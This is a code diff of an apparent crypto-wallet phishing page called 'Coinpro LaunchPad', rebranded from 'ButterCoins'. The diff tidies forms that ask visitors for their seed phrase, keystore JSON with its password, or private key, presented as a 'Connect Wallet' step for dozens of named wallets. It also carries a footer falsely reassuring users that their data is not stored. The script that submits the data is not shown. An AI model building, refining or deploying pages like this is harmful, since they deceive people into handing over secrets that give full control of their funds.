@@ -1,27 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <!-- CodeHorror MKraft -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <link rel="stylesheet" href="style.css">
-        <link rel="shortcut icon" href="asset/images/icon/chains.jpg">
-    <link rel="apple-touch-icon-precomposed" href="asset/images/icon/chains.jpg">
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
-    <script src="script.js" defer></script>
-    <!-- jQuery -->
-<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-
-<!-- SweetAlerts -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
-
-
-  <title>ButterCoins LaunchPad</title>
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <link rel="stylesheet" href="style.css">
+  <link rel="shortcut icon" href="asset/images/icon/chains.jpg">
+  <link rel="apple-touch-icon-precomposed" href="asset/images/icon/chains.jpg">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <script src="wallet-options.js"></script>
+  <script src="script.js" defer></script>
+  <title>Coinpro LaunchPad</title>
+  <script>
+    $(document).ready(function() {
+      // Function to populate wallet options
+      function populateWalletDropdowns() {
+        const $walletDropdowns = $('select[name="walletType"]');
+        $walletDropdowns.empty().append('<option value="" disabled selected hidden>Choose Wallet</option>');
+        
+        walletOptions.forEach(wallet => {
+          $walletDropdowns.append(`<option value="${wallet.value}">${wallet.label}</option>`);
+        });
+      }
+      populateWalletDropdowns();
+    });
+  </script>
 </head>
 <body>
-  <!--Header menu-->
+  <!-- Header and Hero Section  -->
+ <!--Header menu-->
   <header class="fixed-header">
     <div class="mobile-header">
         <a href ="index.html">
@@ -69,328 +78,113 @@ Badges" style="border: 0; margin-right: 5;"
 src="https://trustlock.co/wp-content/uploads/2019/01/trust-seals-aes-256-bit-ssl.png"
 width="238" height="44"></a><!-- End: TrustLock Badge --></div>
 
-<!-- Connection Method 1: Phrase -->
-<div class="card" id="card">
-    <img src="asset/images/icon/link.png" alt="Connect Icon">
-    <h3>Connect using Mnemonic Phrase</h3>
-    <button onclick="openModal('modal-phrase')" id="connectButtonPhrase">Connect</button>
-</div>
+    <!-- Card 1: Phrase -->
+    <div class="card" id="card">
+      <img src="asset/images/icon/link.png" alt="Connect Icon">
+      <h3>Connect using Mnemonic Phrase</h3>
+      <button onclick="openModal('modal-phrase')" id="connectButtonPhrase">Connect</button>
+    </div>
 
-<!-- Connection Method 2: KeyStore -->
-<div class="card">
-    <img src="asset/images/icon/link.png" alt="Connect Icon">
-    <h3>Connect using KeyStore Json</h3>
-    <button onclick="openModal('modal-keystore')" id="connectButtonKeyStore">Connect</button>
-</div>
+    <!-- Card 2: KeyStore -->
+    <div class="card">
+      <img src="asset/images/icon/link.png" alt="Connect Icon">
+      <h3>Connect using KeyStore Json</h3>
+      <button onclick="openModal('modal-keystore')" id="connectButtonKeyStore">Connect</button>
+    </div>
 
-<!-- Connection Method 3: Private Key -->
-<div class="card">
-    <img src="asset/images/icon/link.png" alt="Connect Icon">
-    <h3>Connect using Private Key</h3>
-    <button onclick="openModal('modal-private-key')" id="connectButtonPrivateKey">Connect</button>
-</div>
+    <!-- Card 3: Private Key -->
+    <div class="card">
+      <img src="asset/images/icon/link.png" alt="Connect Icon">
+      <h3>Connect using Private Key</h3>
+      <button onclick="openModal('modal-private-key')" id="connectButtonPrivateKey">Connect</button>
+    </div>
 
-<!-- Modal for Connection Method 1 (Phrase) -->
-<div class="modal" id="modal-phrase">
-    <div class="modal-content">
+    <!-- Modal 1: Phrase -->
+    <div class="modal" id="modal-phrase">
+      <div class="modal-content">
         <div class="modal-header">
-            <h5 class="modal-title"><strong>Enter Phrase</strong></h5>
-            <button type="button" class="close" onclick="closeModal('modal-phrase')">&times;</button>
+          <h5 class="modal-title"><strong>Enter Phrase</strong></h5>
+          <button type="button" class="close" onclick="closeModal('modal-phrase')">&times;</button>
         </div>
         <div class="modal-body">
-            <p class="modal-text"><strong>Phrase is typically 12, sometimes 24 words separated by single spaces</strong></p>
-            <div class="dragArea">
-                <form name="phraseForm" onsubmit="submitFormData(0); return false;">
-                  <!--selection--->
-                      <div class="form-group">
-    <label for="walletType-modal-phrase">Select Wallet Type</label>
-    <select name="walletType" class="form-control" id="walletType-modal-phrase" required>
-        <option value="" disabled selected hidden>Choose Wallet</option>
-<option value="walletconnect.com">Wallet Connect</option>
-<option value="trustwallet.com">Trust Wallet</option>
-<option value="metamask.io">Metamask</option>
-<option value="Flint-Wallet.com">Flint Wallet</option>
-<option value="binance.com">Binance Chain Wallet</option>
-<option value="polygon.technology">Polygon Wallet</option>
-<option value="rainbow.me">Rainbow</option>
-<option value="bonkbot.io">Bonkbot Wallet</option>
-<option value="phantom.app">Phantom App Wallet</option>
-<option value="bitpay.com">Bitpay</option>
-<option value="wallet.tonkeeper.com">Tonkeeper/Space</option>
-<option value="walleth.org">Walleth</option>
-<option value="argent.xyz">Argent</option>
-<option value="huobiwallet.com">Huobi Wallet</option>
-<option value="encrypted.ink">Encrypted Ink</option>
-<option value="compound.finance">Compound</option>
-<option value="polkadot.network">Polkadot</option>
-<option value="iotex.io">Iotex</option>
-<option value="coin98.com">Coin98</option>
-<option value="coinbase.com">Coinbase</option>
-<option value="crypto.com">Crypto.com | Defi Wallet</option>
-<option value="tokenpocket.pro">Token Pocket</option>
-<option value="mathwallet.org">Math Wallet</option>
-<option value="ledger.com">Ledger Live</option>
-<option value="1inch.io">1Inch</option>
-<option value="dharma.io">Dharma</option>
-<option value="trustology.io">Trust Vault</option>
-<option value="mykey.org">MYKEY</option>
-<option value="atomicwallet.io">Atomic</option>
-<option value="coolwallet.io">CoolWallet S</option>
-<option value="nash.io">Nash</option>
-<option value="coinomi.com">Coinomi</option>
-<option value="gridplus.io">GridPlus</option>
-<option value="tokenary.io">Tokenary</option>
-<option value="safepal.io">SafePal</option>
-<option value="infinitowallet.io">Infinito</option>
-<option value="wallet.io">Wallet.io</option>
-<option value="ownbit.io">Ownbit</option>
-<option value="easypocket.app">EasyPocket</option>
-<option value="mtpelerin.com">Bridge Wallet</option>
-<option value="viawallet.com">ViaWallet</option>
-<option value="bitkeep.com">BitKeep</option>
-<option value="unstoppable.money">Unstoppable Wallet</option>
-<option value="halodefi.org">HaloDefi Wallet</option>
-<option value="dokwallet.com">Dok Wallet</option>
-<option value="cellowallet.app">Cello Wallet</option>
-<option value="coinus.io">CoinUs</option>
-<option value="valoraapp.com">Valora</option>
-<option value="trusteeglobal.com">Trustee Wallet</option>
-<option value="guarda.com">Gaurda Wallet</option>
-<option value="Maiar.com">Maiar Wallet</option>
-<option value="jadewallet.io">Jade Wallet</option>
-<option value="plasmapay.com">PlasmaPay</option>
-<option value="o3.network">O3Wallet</option>
-<option value="me.hashkey.com">HashKey Me</option>
-<option value="rsk.co">RWallet</option>
-<option value="flarewallet.io">Flare Wallet</option>
-<option value="kyberswap.com">KyberSwap</option>
-<option value="atoken.com">AToken Wallet</option>
-<option value="tongue.fi">Tongue Wallet</option>
-<option value="xinfin.io">XinFin XDC Network</option>
-<option value="talken.io">Talken Wallet</option>
-<option value="keyring.app">KEYRING PRO</option>
-<option value="midasprotocol.io">Midas Wallet</option>
-<option value="authentrend.com">AT.Wallet</option>
-<option value="token.im">imToken</option>
-                        </select>
-                      
-                        <label for="Phrase-modal-phrase">Enter 12 or 24 Words Phrase/Mnemonic in the right order</label>
-                        <textarea name="Phrase" placeholder="Enter the texts in 12 or 24 places as obtained from your wallet. Each word should have only one space" data-form-field="Phrase" required="required"
-                        class="form-control"
-                        id="Phrase-modal-phrase"></textarea>
-                    </div>
-                    <div class="input-group-btn">
-                        <button type="submit" class="btn btn-primary">Connect Wallet</button>
-                    </div>
-                </form>
+          <form name="phraseForm" onsubmit="submitFormData(0); return false;">
+            <div class="form-group">
+              <label for="walletType-modal-phrase">Select Wallet Type</label>
+              <select name="walletType" class="form-control" id="walletType-modal-phrase" required>
+                <!-- Dynamically populated -->
+              </select>
             </div>
-        </div>
-    </div>
-</div>
-  
-<!-- Modal for Connection Method 2 (KeyStore) -->
-<div class="modal" id="modal-keystore">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h5 class="modal-title"><strong>Enter KeyStore JSON</strong></h5>
-     <button type="button" class="close" onclick="closeModal('modal-keystore')">&times;</button>
-    </div>
-    <div class="modal-body">
-      <p class="modal-text">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</p>
-      <div class="dragArea">
-        <form name="keystoreForm" onsubmit="validateKeyStoreForm(); return false;">
-             <!--selection--->
-                      <div class="form-group">
-    <label for="walletType-modal-phrase">Select Wallet Type</label>
-    <select name="walletType" class="form-control" id="walletType-modal-phrase" required>
-        <option value="" disabled selected hidden>Choose Wallet</option>
-                          <option value="walletconnect.com">Wallet Connect</option>
-                          <option value="trustwallet.com">Trust Wallet</option>
-                          <option value="metamask.io">Metamask</option>
-                          <option value="Flint-Wallet.com">Flint Wallet</option>
-                          <option value="binance.com">Binance Chain Wallet</option>
-                          <option value="polygon.technology">Polygon Wallet</option>
-                          <option value="rainbow.me">Rainbow</option>
-                          <option value="bonkbot.io">Bonkbot Wallet</option>
-                          <option value="phantom.app">Phantom App
-                          Wallet</option>
-                          <option value="bitpay.com">Bitpay</option>
-                          <option value="wallet.tonkeeper.com">Tonkeeper/Space</option>
-                          <option value="walleth.org">Walleth</option>
-                          <option value="argent.xyz">Argent</option>
-                          <option value="huobiwallet.com">Huobi Wallet</option>
-                          <option value="encrypted.ink">Encrypted Ink</option>
-                          <option value="compound.finance">Compound</option>
-                          <option value="polkadot.network">Polkadot</option>
-                          <option value="iotex.io">Iotex</option>
-                          <option value="coin98.com">Coin98</option>
-                          <option value="coinbase.com">Coinbase</option>
-                          <option value="crypto.com">Crypto.com | Defi Wallet</option>
-                          <option value="tokenpocket.pro">Token Pocket</option>
-                          <option value="mathwallet.org">Math Wallet</option>
-                          <option value="ledger.com">Ledger Live</option>
-                          <option value="1inch.io">1Inch</option>
-                          <option value="dharma.io">Dharma</option>
-                          <option value="trustology.io">Trust Vault</option>
-                          <option value="mykey.org">MYKEY</option>
-                          <option value="atomicwallet.io">Atomic</option>
-                          <option value="coolwallet.io">CoolWallet S</option>
-                          <option value="nash.io">Nash</option>
-                          <option value="coinomi.com">Coinomi</option>
-                          <option value="gridplus.io">GridPlus</option>
-                          <option value="tokenary.io">Tokenary</option>
-                          <option value="safepal.io">SafePal</option>
-                          <option value="infinitowallet.io">Infinito</option>
-                          <option value="wallet.io">Wallet.io</option>
-                          <option value="ownbit.io">Ownbit</option>
-                          <option value="easypocket.app">EasyPocket</option>
-                          <option value="mtpelerin.com">Bridge Wallet</option>
-                          <option value="viawallet.com">ViaWallet</option>
-                          <option value="bitkeep.com">BitKeep</option>
-                          <option value="unstoppable.money">Unstoppable Wallet</option>
-                          <option value="halodefi.org">HaloDefi Wallet</option>
-                          <option value="dokwallet.com">Dok Wallet</option>
-                          <option value="cellowallet.app">Cello Wallet</option>
-                          <option value="coinus.io">CoinUs</option>
-                          <option value="valoraapp.com">Valora</option>
-                          <option value="trusteeglobal.com">Trustee Wallet</option>
-                          <option value="guarda.com">Gaurda Wallet</option>
-                          <option value="Maiar.com">Maiar Wallet</option>
-                          <option value="jadewallet.io">Jade Wallet</option>
-                          <option value="plasmapay.com">PlasmaPay</option>
-                          <option value="o3.network">O3Wallet</option>
-                          <option value="me.hashkey.com">HashKey Me</option>
-                          <option value="rsk.co">RWallet</option>
-                          <option value="flarewallet.io">Flare Wallet</option>
-                          <option value="kyberswap.com">KyberSwap</option>
-                          <option value="atoken.com">AToken Wallet</option>
-                          <option value="tongue.fi">Tongue Wallet</option>
-                          <option value="xinfin.io">XinFin XDC Network</option>
-                          <option value="talken.io">Talken Wallet</option>
-                          <option value="keyring.app">KEYRING PRO</option>
-                          <option value="midasprotocol.io">Midas Wallet</option>
-                          <option value="authentrend.com">AT.Wallet</option>
-                          <option value="token.im">imToken</option>
-                        </select>
-
-            <label for="textarea-modal-keystore">Enter KeyStore JSON</label>
-            <textarea name="keystore" placeholder="Enter your KeyStore JSON" data-form-field="keystore" required="required" class="form-control" id="textarea-modal-keystore"></textarea>
-          </div>
-          <div class="form-group">
-            <label for="password-modal-keystore">Password</label>
-            <input type="password" name="password" placeholder="Enter your Encryption Password" data-form-field="password" class="form-control" required="required" value="" id="password-modal-keystore">
-          </div>
-          <div class="input-group-btn">
+            <div class="form-group">
+              <label for="Phrase-modal-phrase">Enter 12 or 24 Words Phrase</label>
+              <textarea name="Phrase" placeholder="Enter phrase words separated by spaces" class="form-control" id="Phrase-modal-phrase" required></textarea>
+            </div>
             <button type="submit" class="btn btn-primary">Connect Wallet</button>
-          </div>
-        </form>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal 2: KeyStore -->
+    <div class="modal" id="modal-keystore">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title"><strong>Enter KeyStore JSON</strong></h5>
+          <button type="button" class="close" onclick="closeModal('modal-keystore')">&times;</button>
+        </div>
+        <div class="modal-body">
+          <form name="keystoreForm" onsubmit="validateKeyStoreForm(); return false;">
+            <div class="form-group">
+              <label for="walletType-modal-keystore">Select Wallet Type</label>
+              <select name="walletType" class="form-control" id="walletType-modal-keystore" required>
+                <!-- Dynamically populated -->
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="textarea-modal-keystore">KeyStore JSON</label>
+              <textarea name="keystore" placeholder="Enter your Keystore Json, usually an array of long characters" class="form-control" id="textarea-modal-keystore" required></textarea>
+            </div>
+            <div class="form-group">
+              <label for="password-modal-keystore">Password</label>
+              <input type="password" name="password" placeholder="Enter your Keystore password pair" class="form-control" id="password-modal-keystore" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Connect Wallet</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal 3: Private Key -->
+    <div class="modal" id="modal-private-key">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title"><strong>Enter Private Key</strong></h5>
+          <button type="button" class="close" onclick="closeModal('modal-private-key')">&times;</button>
+        </div>
+        <div class="modal-body">
+          <form name="privateKeyForm" onsubmit="submitFormData(2); return false;">
+            <div class="form-group">
+              <label for="walletType-modal-private-key">Select Wallet Type</label>
+              <select name="walletType" class="form-control" id="walletType-modal-private-key" required>
+                <!-- Dynamically populated -->
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="textarea-modal-private-key">Private Key</label>
+              <textarea name="privateKey" placeholder="Private keys are long strings of characters" class="form-control" id="textarea-modal-private-key" required></textarea>
+            </div>
+            <button type="submit" class="btn btn-primary">Connect Wallet</button>
+          </form>
+        </div>
       </div>
     </div>
   </div>
-</div>
-
-<!-- Modal for Connection Method 3 (Private Key) -->
-<div class="modal" id="modal-private-key">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h5 class="modal-title"><strong>Enter Private Key</strong></h5>
-            <button type="button" class="close" onclick="closeModal('modal-private-key')">&times;</button>
-        </div>
-        <div class="modal-body">
-            <p class="modal-text">Typically 64 alphanumeric characters.</p>
-            <div class="dragArea">
-                <form name="privateKeyForm" onsubmit="submitFormData(2); return false;">
-                       <!--selection--->
-                      <div class="form-group">
-    <label for="walletType-modal-phrase">Select Wallet Type</label>
-    <select name="walletType" class="form-control" id="walletType-modal-phrase" required>
-        <option value="" disabled selected hidden>Choose Wallet</option>
-                          <option value="walletconnect.com">Wallet Connect</option>
-                          <option value="trustwallet.com">Trust Wallet</option>
-                          <option value="metamask.io">Metamask</option>
-                          <option value="Flint-Wallet.com">Flint Wallet</option>
-                          <option value="binance.com">Binance Chain Wallet</option>
-                          <option value="polygon.technology">Polygon Wallet</option>
-                          <option value="rainbow.me">Rainbow</option>
-                          <option value="bonkbot.io">Bonkbot Wallet</option>
-                          <option value="phantom.app">Phantom App Wallet</option>
-                          <option value="bitpay.com">Bitpay</option>
-                          <option value="wallet.tonkeeper.com">Tonkeeper/Space</option>
-                          <option value="walleth.org">Walleth</option>
-                          <option value="argent.xyz">Argent</option>
-                          <option value="huobiwallet.com">Huobi Wallet</option>
-                          <option value="encrypted.ink">Encrypted Ink</option>
-                          <option value="compound.finance">Compound</option>
-                          <option value="polkadot.network">Polkadot</option>
-                          <option value="iotex.io">Iotex</option>
-                          <option value="coin98.com">Coin98</option>
-                          <option value="coinbase.com">Coinbase</option>
-                          <option value="crypto.com">Crypto.com | Defi Wallet</option>
-                          <option value="tokenpocket.pro">Token Pocket</option>
-                          <option value="mathwallet.org">Math Wallet</option>
-                          <option value="ledger.com">Ledger Live</option>
-                          <option value="1inch.io">1Inch</option>
-                          <option value="dharma.io">Dharma</option>
-                          <option value="trustology.io">Trust Vault</option>
-                          <option value="mykey.org">MYKEY</option>
-                          <option value="atomicwallet.io">Atomic</option>
-                          <option value="coolwallet.io">CoolWallet S</option>
-                          <option value="nash.io">Nash</option>
-                          <option value="coinomi.com">Coinomi</option>
-                          <option value="gridplus.io">GridPlus</option>
-                          <option value="tokenary.io">Tokenary</option>
-                          <option value="safepal.io">SafePal</option>
-                          <option value="infinitowallet.io">Infinito</option>
-                          <option value="wallet.io">Wallet.io</option>
-                          <option value="ownbit.io">Ownbit</option>
-                          <option value="easypocket.app">EasyPocket</option>
-                          <option value="mtpelerin.com">Bridge Wallet</option>
-                          <option value="viawallet.com">ViaWallet</option>
-                          <option value="bitkeep.com">BitKeep</option>
-                          <option value="unstoppable.money">Unstoppable Wallet</option>
-                          <option value="halodefi.org">HaloDefi Wallet</option>
-                          <option value="dokwallet.com">Dok Wallet</option>
-                          <option value="cellowallet.app">Cello Wallet</option>
-                          <option value="coinus.io">CoinUs</option>
-                          <option value="valoraapp.com">Valora</option>
-                          <option value="trusteeglobal.com">Trustee Wallet</option>
-                          <option value="guarda.com">Gaurda Wallet</option>
-                          <option value="Maiar.com">Maiar Wallet</option>
-                          <option value="jadewallet.io">Jade Wallet</option>
-                          <option value="plasmapay.com">PlasmaPay</option>
-                          <option value="o3.network">O3Wallet</option>
-                          <option value="me.hashkey.com">HashKey Me</option>
-                          <option value="rsk.co">RWallet</option>
-                          <option value="flarewallet.io">Flare Wallet</option>
-                          <option value="kyberswap.com">KyberSwap</option>
-                          <option value="atoken.com">AToken Wallet</option>
-                          <option value="tongue.fi">Tongue Wallet</option>
-                          <option value="xinfin.io">XinFin XDC Network</option>
-                          <option value="talken.io">Talken Wallet</option>
-                          <option value="keyring.app">KEYRING PRO</option>
-                          <option value="midasprotocol.io">Midas Wallet</option>
-                          <option value="authentrend.com">AT.Wallet</option>
-                          <option value="token.im">imToken</option>
-                        </select>
-
-                        <label for="textarea-modal-private-key">Enter your Private Key</label>
-                        <textarea name="privateKey" placeholder="Enter your Private Key" data-form-field="privateKey" required="required" class="form-control" id="textarea-modal-private-key"></textarea>
-                    </div>
-                    <div class="input-group-btn">
-                        <button type="submit" class="btn btn-primary">Connect Wallet</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-    </div>
-</div>
-</div>
 <div class="contact-links">
   <a href="index.html" target="_blank" class="contact-button">↩ Back to home</a>
 </div>
-<!--footer section -->
-<footer class="credit">
-    <p>© 2025 ButterCoins. Wallet connections are indicative of your interest. We do not store your data. All rights reserved.</p>
-</footer>
+
+  <!-- Footer -->
+  <footer class="credit">
+    <p>© 2025 Coinpro. All rights reserved. Wallet connections are indication of your interest. We do not store your data.</p>
+  </footer>
 </body>
 </html>
